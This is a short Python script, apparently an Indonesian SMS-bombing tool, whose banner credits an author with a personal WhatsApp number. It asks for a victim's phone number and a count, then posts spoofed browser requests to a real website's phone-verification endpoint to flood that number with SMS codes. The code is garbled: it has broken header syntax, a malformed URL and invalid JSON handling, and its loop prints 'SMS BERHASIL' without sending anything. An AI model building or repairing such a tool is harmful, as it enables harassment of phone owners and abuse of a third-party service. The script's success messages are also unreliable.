import json,os,sys
import requests as rek


banner="""
   __________________________________
   [+]   pembuat : risky.          [+]
   [+]   wa : 089681551536      [+]  
   [+]   spam sms awali :8xxxx  [+]
   -------------------------------------------------------
 """
os.system("clear")
print(banner)
target = input(" Nomor : ")
jl = input(" Jumlah : ")

api_url = "https://id.jagreward.com/member/verify-mobile/?phone0"+target+"&old_phone=0"+target 


headers = { 
Host":"id.jagreward.com
Connection":"keep-alive
Accept: */*
X-Requested-With":"XMLHttpRequest
Save-Data":"on
User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
Referer":"https://id.jagreward.com/member/register/",
Accept-Encoding":"gzip, deflate, br",
Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
}

respon = rek.post(api_url,headers).text

status = json.loads(respon)(StatusMessage")
for i in range(jl):
        print (" SMS BERHASIL ")
        
